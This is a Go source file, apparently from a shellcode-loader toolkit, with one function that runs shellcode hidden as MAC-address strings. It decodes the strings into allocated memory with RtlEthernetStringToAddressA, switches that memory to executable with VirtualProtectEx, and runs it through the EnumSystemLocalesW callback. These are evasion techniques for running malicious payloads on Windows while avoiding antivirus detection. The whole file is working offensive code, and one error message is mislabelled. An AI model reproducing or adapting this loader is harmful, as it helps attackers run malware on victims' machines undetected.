package loader

import (
	"unsafe"
	"variant/log"
	"variant/xwindows"

	"golang.org/x/sys/windows"
)

func MacAddressA(shellcode []string) {
	addr, err := xwindows.AllocADsMem(uintptr(len(shellcode) * 6))
	if addr == 0 {
		log.Fatalf("AllocADsMem() err: %v", err)
	}

	addrPtr := addr
	for _, mac := range shellcode {
		u := append([]byte(mac), 0)

		_, err = xwindows.RtlEthernetStringToAddressA(
			uintptr(unsafe.Pointer(&u[0])),
			&u[0],
			(*byte)(unsafe.Pointer(&addrPtr)),
		)
		if err != nil && err.Error() != "The operation completed successfully." {
			log.Fatalf("RtlEthernetStringToAddressA() err: %v", err)
		}

		addrPtr += 6
	}

	oldProtect := windows.PAGE_READWRITE
	errVPEx := xwindows.VirtualProtectEx(
		windows.CurrentProcess(),
		addr,
		uintptr(len(shellcode)*6),
		windows.PAGE_EXECUTE_READWRITE,
		(*uint32)(unsafe.Pointer(&oldProtect)),
	)
	if errVPEx != nil {
		log.Fatalf("RtlEthernetStringToAddressA() err: %v", errVPEx)
	}

	_, _ = xwindows.EnumSystemLocalesW(addr, 0)
}
